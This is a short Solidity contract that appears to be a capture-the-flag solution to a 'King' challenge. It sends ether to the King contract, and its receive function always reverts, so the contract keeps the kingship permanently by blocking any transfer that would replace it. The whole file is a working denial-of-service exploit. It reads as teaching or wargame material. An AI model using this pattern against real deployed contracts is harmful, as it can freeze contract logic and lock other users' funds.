// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./King.sol";

contract KingSolved {

  address payable public king;

  constructor(address payable _king) public payable {
    king = _king;
  }

  function breakKing() public {
    (bool sent,) = king.call{value: address(this).balance, gas: 100000}("");
  }

  receive() external payable {
    // this will revert the transfer call 
    // breaking the recmailation of kingship
    revert();
  }

}